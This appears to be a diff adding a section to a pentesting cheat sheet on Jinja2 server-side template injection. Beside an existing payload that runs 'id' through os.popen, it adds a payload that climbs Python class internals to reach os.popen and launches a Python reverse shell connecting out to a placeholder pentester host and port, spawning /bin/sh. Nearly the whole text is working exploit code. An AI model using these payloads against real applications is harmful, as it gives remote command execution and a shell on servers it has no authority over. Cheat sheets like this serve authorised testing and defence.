@@ -986,3 +986,9 @@ there are also some specific functions that facilitate the exploitation of jinja
 {{lipsum.__globals__.os.popen('id').read()}}
 ```
 
+we can also create a reverse shell with payloads like: 
+
+```python
+{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
+```
+
